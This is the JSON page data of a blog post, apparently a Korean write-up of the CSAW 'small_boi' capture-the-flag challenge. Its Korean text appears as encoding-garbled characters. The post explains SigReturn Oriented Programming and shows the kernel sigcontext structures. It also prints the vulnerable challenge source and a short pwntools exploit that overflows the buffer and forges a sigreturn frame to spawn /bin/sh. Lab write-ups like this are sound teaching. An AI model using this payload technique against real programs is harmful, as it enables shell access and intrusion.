{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/csaw_small_boi_ctf_writeup/",
    "result": {"data":{"cur":{"id":"7aa9785d-9403-57d9-97d5-658045915602","html":"<h1 id=\"ì·¨ì•½ì -ë¶„ì„\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"ì·¨ì•½ì  ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ì·¨ì•½ì  ë¶„ì„</h1>\n<blockquote>\n<p>SROP</p>\n<ul>\n<li>\n<p>ë¦¬ëˆ…ìŠ¤ì—ì„œëŠ” ì‹œê·¸ë„ì´ ë“¤ì–´ì˜¤ê²Œ ë˜ë©´ ì»¤ë„ ëª¨ë“œì—ì„œ ì²˜ë¦¬í•œë‹¤.</p>\n</li>\n<li>\n<p>ì»¤ë„ ëª¨ë“œì—ì„œ ìœ ì €ëª¨ë“œë¡œ ë“¤ì–´ì˜¤ëŠ” ê³¼ì •ì—ì„œ ìœ ì €ì˜ ìŠ¤íƒì— ë ˆì§€ìŠ¤í„° ì •ë³´ë“¤ì„ ì €ì¥í•´ ë†“ëŠ”ë‹¤.</p>\n</li>\n<li>\n<p><code class=\"language-text\">rt_sigreturn</code> ì€ ì´ë ‡ê²Œ ì €ì¥í•´ë†“ì€ ì •ë³´ë“¤ì„ ë‹¤ì‹œ ëŒë ¤ë†“ì„ ë•Œ ì‚¬ìš©ëœë‹¤.</p>\n</li>\n<li>\n<p>ê³µê²©ìê°€ <code class=\"language-text\">rt_sigreturn</code> ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•  ìˆ˜ ìˆê³  ìŠ¤íƒì„ ì¡°ì‘í•  ìˆ˜ ìˆë‹¤ë©´ ëª¨ë“  ë ˆì§€ìŠ¤í„°ì™€ > ì„¸ê·¸ë¨¼íŠ¸ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆë‹¤.</p>\n</li>\n<li>\n<p><code class=\"language-text\">rt_sigreturn</code> ì‹œìŠ¤í…œ ì½œì„ ì‚¬ìš©í•˜ì—¬ ìµìŠ¤í´ë¡œì‡ í•˜ëŠ” ê¸°ë²•ì„ SigReturn Oriented Programming > (SROP)ë¼ê³  í•œë‹¤.</p>\n</li>\n</ul>\n</blockquote>\n<h2 id=\"restore_sigcontext\" style=\"position:relative;\"><a href=\"#restore_sigcontext\" aria-label=\"restore_sigcontext permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>restore_sigcontext</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">restore_sigcontext</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">pt_regs</span> <span class=\"token operator\">*</span>regs<span class=\"token punctuation\">,</span>\n\t\t\t      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span> __user <span class=\"token operator\">*</span>sc<span class=\"token punctuation\">,</span>\n\t\t\t      <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> uc_flags<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> buf_val<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">void</span> __user <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> tmpflags<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> err <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">/* Always make any pending restarted system calls return -EINTR */</span>\n\tcurrent<span class=\"token operator\">-></span>restart_block<span class=\"token punctuation\">.</span>fn <span class=\"token operator\">=</span> do_no_restart_syscall<span class=\"token punctuation\">;</span>\n\tget_user_try <span class=\"token punctuation\">{</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_X86_32</span></span>\n\t\t<span class=\"token function\">set_user_gs</span><span class=\"token punctuation\">(</span>regs<span class=\"token punctuation\">,</span> <span class=\"token function\">GET_SEG</span><span class=\"token punctuation\">(</span>gs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>es<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>ds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span> <span class=\"token comment\">/* CONFIG_X86_32 */</span></span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>di<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>si<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>bp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>sp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>bx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>dx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>cx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>ax<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_X86_64</span></span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r11<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">COPY</code>, <code class=\"language-text\">COPY_SEG</code> ë§¤í¬ë¡œë¥¼ ì‚¬ìš©í•˜ì—¬ ë ˆì§€ìŠ¤í„°ë° ì„¸ê·¸ë¨¼íŠ¸ë¥¼ ë³µì›í•œë‹¤.</li>\n</ul>\n<h2 id=\"sigcontext-32bit\" style=\"position:relative;\"><a href=\"#sigcontext-32bit\" aria-label=\"sigcontext 32bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sigcontext-32bit</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">,</span> gsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">,</span> fsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> es<span class=\"token punctuation\">,</span> esh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ds<span class=\"token punctuation\">,</span> dsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edi<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esi<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebp<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ecx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eax<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> trapno<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> err<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eip<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">,</span> __csh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eflags<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp_at_signal<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ss<span class=\"token punctuation\">,</span> __ssh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> oldmask<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> cr2<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"sigcontext-64bit\" style=\"position:relative;\"><a href=\"#sigcontext-64bit\" aria-label=\"sigcontext 64bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sigcontext-64bit</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span>\n<span class=\"token punctuation\">{</span>\n  __uint64_t r8<span class=\"token punctuation\">;</span>\n  __uint64_t r9<span class=\"token punctuation\">;</span>\n  __uint64_t r10<span class=\"token punctuation\">;</span>\n  __uint64_t r11<span class=\"token punctuation\">;</span>\n  __uint64_t r12<span class=\"token punctuation\">;</span>\n  __uint64_t r13<span class=\"token punctuation\">;</span>\n  __uint64_t r14<span class=\"token punctuation\">;</span>\n  __uint64_t r15<span class=\"token punctuation\">;</span>\n  __uint64_t rdi<span class=\"token punctuation\">;</span>\n  __uint64_t rsi<span class=\"token punctuation\">;</span>\n  __uint64_t rbp<span class=\"token punctuation\">;</span>\n  __uint64_t rbx<span class=\"token punctuation\">;</span>\n  __uint64_t rdx<span class=\"token punctuation\">;</span>\n  __uint64_t rax<span class=\"token punctuation\">;</span>\n  __uint64_t rcx<span class=\"token punctuation\">;</span>\n  __uint64_t rsp<span class=\"token punctuation\">;</span>\n  __uint64_t rip<span class=\"token punctuation\">;</span>\n  __uint64_t eflags<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> pad0<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">uint64_t</span> err<span class=\"token punctuation\">;</span>\n  __uint64_t trapno<span class=\"token punctuation\">;</span>\n  __uint64_t oldmask<span class=\"token punctuation\">;</span>\n  __uint64_t cr2<span class=\"token punctuation\">;</span>\n  extension <span class=\"token keyword\">union</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span>\n      __uint64_t __fpstate_word<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  __uint64_t __reserved1 <span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>í•´ë‹¹ <code class=\"language-text\">sigcontext</code> êµ¬ì¡°ì²´ë¥¼ ë°”íƒ•ìœ¼ë¡œ SROP ê¸°ë²•ìœ¼ ì´ìš©í•˜ì—¬ ê³µê²©ì„ ì§„í–‰í•  ìˆ˜ ìˆë‹¤.</li>\n</ul>\n<h2 id=\"ë¬¸ì œ-small_boic\" style=\"position:relative;\"><a href=\"#%EB%AC%B8%EC%A0%9C-small_boic\" aria-label=\"ë¬¸ì œ small_boic permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë¬¸ì œ small_boi.c</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token comment\">/* I wonder what you have to do with this sigreturn gadget */</span>\n<span class=\"token keyword\">volatile</span> <span class=\"token keyword\">void</span> <span class=\"token function\">one_true_gadget</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov $0xf, %eax;\"</span> <span class=\"token comment\">// sigreturn</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"poprax:\"</span>\n    <span class=\"token string\">\"pop %rax;\"</span>\n    <span class=\"token string\">\"ret;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>useful_string <span class=\"token operator\">=</span> <span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">char</span> useful_byte <span class=\"token operator\">=</span> <span class=\"token string\">'i'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov %0, %%rsi;\"</span>\n        <span class=\"token operator\">:</span>\n        <span class=\"token operator\">:</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">:</span> <span class=\"token string\">\"%rsi\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xor %rax, %rax;\"</span>\n        <span class=\"token string\">\"xor %rdi, %rdi;\"</span>\n        <span class=\"token string\">\"mov $0x200, %rdx;\"</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xor %rdi, %rax;\"</span>\n        <span class=\"token string\">\"mov $60, %rax;\"</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>ë¬¸ì œ ë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•´ ë³´ë©´ <code class=\"language-text\">sigreturn</code> , <code class=\"language-text\">/bin/sh</code>, <code class=\"language-text\">syscall</code> ë“± ìµìŠ¤ë¥¼ í•˜ê¸°ì— í•„ìš”í•œ ëª…ë ¹ë“¤ì´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°</li>\n<li>ì¹´ë‹ˆë¦¬ ë³´í˜¸ ê¸°ë²•ì´ ê±¸ë ¤ ìˆì§€ ì•Šì•„ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë°œìƒì‹œì¼œ return ì£¼ì†Œë¥¼ sigreturn call í•˜ì—¬ SROPë¥¼ í•  ìˆ˜ ìˆë‹¤.</li>\n<li>main í•¨ìˆ˜ì—ì„œ read í•¨ìˆ˜ë¥¼ ë°”íƒ•ìœ¼ë¡œ 0x200 ë°”ì´íŠ¸ë¥¼ ì…ë ¥ ë°›ê¸° ë•Œë¬¸ì— ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•œë‹¤.</li>\n</ul>\n<h2 id=\"srop\" style=\"position:relative;\"><a href=\"#srop\" aria-label=\"srop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SROP</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">binshell <span class=\"token operator\">=</span> <span class=\"token number\">0x4001ca</span>\nsi_return <span class=\"token operator\">=</span> <span class=\"token number\">0x400180</span>\nsyscall <span class=\"token operator\">=</span> <span class=\"token number\">0x400185</span>\n\nframe <span class=\"token operator\">=</span> <span class=\"token function\">SigreturnFrame</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve\nframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> binshell\nframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall\n\npayload <span class=\"token operator\">=</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">40</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>si_return<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>frame<span class=\"token punctuation\">)</span>\n<span class=\"token function\">sl</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n<span class=\"token function\">irt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>SROPë¥¼ í•˜ê¸° ìœ„í•´ì„œëŠ” êµ¬ì¡°ì²´ì˜ ê°’ì„ ì¼ì¼ì´ ë‹¤ ë§ì³ì„œ ì§œì•¼ í•œë‹¤ëŠ” ì ì´ ìˆì§€ë§Œ pwntoolsì˜ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì† ì‰½ê²Œ í•´ë‹¹ ë ˆì§€ìŠ¤í„°ì— í•„ìš”í•œ ê°’ì„ ì¤„ ìˆ˜ ê°€ ìˆë‹¤.</li>\n<li>ìš°ë¦¬ëŠ” execve ì‹œìŠ¤í…œ ì½œì„ ì‚¬ìš©í•˜ì—¬ /bin/sh ì£¼ì†Œë¥¼ ì¸ìë¡œ ì‚¬ìš©í•˜ì—¬ ì‰˜ì„ íšë“í•˜ë©´ ëœë‹¤.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAACGElEQVQoz22O267aMBBF+ZCeBBKPPWM7duwQciHBQMIhcK6ifexTpf7/L1SBStWRKi1Z1thr9l6c6nYapn6Y+uNlN15t2WZFnZfbrGi0r+2md3UvfR2JLAYZM4oZRQyXIJeAi0zZ6+tHE8aVaiE/rlQdUR2rLsIyphp0zcAKXCOVQrmV0EthE3Ip2USoBc/c9fN70+0zMJ5chibHfE1eo1Wy2FpXAXYcOxCGsgTNSliu14JMOssqv3zc2t2hSqAHLAFrwAAi51KhqzNXADWcGqBZFioRBpTnDxmkDafJVa2RZg1kgBxQOV+kBVVwaRh6IA+kKUsxW/E5Hx4yZv7nr9/P17cD0ItQgctByFeOtXKlbSfj90ATlxdOG20ZZow82UYqx0kvuLLXj1u1DUUCFcM8FUUqGoYOyDKhUoFAcgYRNeMq5XN+wuUKaKHLbnq/9YeTUtb7Te5K7yspsyQVMcMnhtH9fGK45LQEiplccRmz+XVxLqrSlTLfaFeadb0EWnI5CwmPUhEl/OlOlIiZ+8YoxZjNLPbavoxTP05VF9owlE2vXYnGCZ1zZYXOlS1kvhbaCmVBmof2Vw7t7vX9dvn8EcZzdzjtT1MYz004Vv2h6Q+74bw7nreHU9n2ZLzQ+Rf54tbPYQjPL9sw+E0bM/y2gkfne0PxIE7F3P8+/CdX0hx3w/HyFsZzGC+74VzUHaMs+vrvv/wBNGWNQ8hTIrEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/74e85d1e0257e52b19b4afbfd362849d/37523/0.png\"\n        srcset=\"/static/74e85d1e0257e52b19b4afbfd362849d/e9ff0/0.png 180w,\n/static/74e85d1e0257e52b19b4afbfd362849d/f21e7/0.png 360w,\n/static/74e85d1e0257e52b19b4afbfd362849d/37523/0.png 720w,\n/static/74e85d1e0257e52b19b4afbfd362849d/7e509/0.png 745w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#restore_sigcontext\">restore_sigcontext</a></li>\n<li><a href=\"#sigcontext-32bit\">sigcontext-32bit</a></li>\n<li><a href=\"#sigcontext-64bit\">sigcontext-64bit</a></li>\n<li><a href=\"#%EB%AC%B8%EC%A0%9C-small_boic\">ë¬¸ì œ small_boi.c</a></li>\n<li><a href=\"#srop\">SROP</a></li>\n</ul>\n</div>","excerpt":"ì·¨ì•½ì  ë¶„ì„ SROP ë¦¬ëˆ…ìŠ¤ì—ì„œëŠ” ì‹œê·¸ë„ì´ ë“¤ì–´ì˜¤ê²Œ ë˜ë©´ ì»¤ë„ ëª¨ë“œì—ì„œ 